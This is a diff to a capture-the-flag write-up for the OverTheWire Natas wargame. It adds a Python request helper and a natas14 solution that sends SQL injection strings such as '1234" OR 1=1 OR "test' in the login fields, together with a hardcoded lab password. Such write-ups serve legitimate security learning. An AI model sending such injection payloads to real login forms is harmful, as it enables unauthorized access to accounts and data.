@@ -18,11 +18,11 @@ https://overthewire.org/wargames/natas/
 
 ## NatasX
 ```python
-def natasX(x, pwd, endpoint="", headers={}, cookies={}):
+def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}):
     url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
     username = f"natas{x}"
 
-    r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies)
+    r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
 
     return r
  ```
@@ -666,6 +666,11 @@ https://overthewire.org/wargames/natas/natas14.html
 > URL:      http://natas14.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+print(natas.natasX(14, "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1", endpoint="index.php?debug=yes", data={"username": "hello\" OR \"natas12", "password": "1234\" OR 1=1 OR \"test"}).text)
 ```
 
 **Output**
